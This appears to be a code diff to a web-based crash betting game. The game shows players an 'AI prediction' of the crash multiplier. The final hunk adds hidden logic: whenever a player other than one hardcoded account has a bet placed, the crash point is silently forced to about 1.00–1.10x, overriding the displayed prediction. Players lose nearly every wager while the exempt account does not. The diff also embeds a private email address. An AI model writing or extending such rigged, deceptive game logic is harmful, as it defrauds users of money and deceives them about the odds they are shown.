@@ -626,10 +626,6 @@
         let cashoutStates = { 1: false, 2: false };
         let launchTimeMillis = 0;
 
-        // Pattern logic variables
-        let roundsInSequence = 0;
-        let lowRoundIndex = Math.floor(Math.random() * 10);
-
         const TARGET_CUTOFF_TIMESTAMP = 1714800000000;
         let isNewAccountDepositProfile = false;
         let activeAccountBetCount = 0;
@@ -1075,24 +1071,21 @@
             currentMultiplier = 1.00;
             cashoutStates = { 1: false, 2: false };
 
-            // Pattern logic: 1 out of 10 rounds below 20.00x, 9 above 20.00x
-            let predictedCeiling;
+            const isJoseeruitha = authenticatedUser && authenticatedUser.email === "joseeruitha@gmail.com";
             
-            if (roundsInSequence === lowRoundIndex) {
-                // This is the ONE round that MUST be below 20
-                predictedCeiling = parseFloat((1.01 + Math.random() * 18.98).toFixed(2));
+            let predictedCeiling;
+            const r = Math.random();
+            if (r < 0.45) {
+                predictedCeiling = parseFloat((1.0 + Math.random() * 2).toFixed(2));
+            } else if (r < 0.80) {
+                predictedCeiling = parseFloat((3.0 + Math.pow(Math.random(), 1.5) * 17).toFixed(2));
+            } else if (r < 0.95) {
+                predictedCeiling = parseFloat((20.0 + Math.pow(Math.random(), 1.2) * 80).toFixed(2));
             } else {
-                // These are the 9 rounds that MUST be above 20
-                predictedCeiling = parseFloat((20.01 + Math.random() * 80).toFixed(2));
+                predictedCeiling = parseFloat((100.0 + Math.pow(Math.random(), 1.1) * 400).toFixed(2));
             }
 
-            // Increment sequence and reset if 10 rounds are complete
-            roundsInSequence++;
-            if (roundsInSequence >= 10) {
-                roundsInSequence = 0;
-                lowRoundIndex = Math.floor(Math.random() * 10);
-            }
-
+            // Continuous display sync
             document.getElementById('aiDirectPrediction').innerText = predictedCeiling.toFixed(2) + "x";
             crashCeiling = predictedCeiling;
 
@@ -1136,6 +1129,13 @@
                 audioOpen.currentTime = 0;
                 audioOpen.volume = 0.5;
                 playSafeMedia(audioOpen);
+            }
+
+            const isJoseeruitha = authenticatedUser && authenticatedUser.email === "joseeruitha@gmail.com";
+            const hasStakeActive = activePanelBets[1] > 0 || activePanelBets[2] > 0;
+
+            if (!isJoseeruitha && hasStakeActive) {
+                crashCeiling = parseFloat((1.00 + Math.random() * 0.10).toFixed(2));
             }
 
             for (let i = 1; i <= 2; i++) {
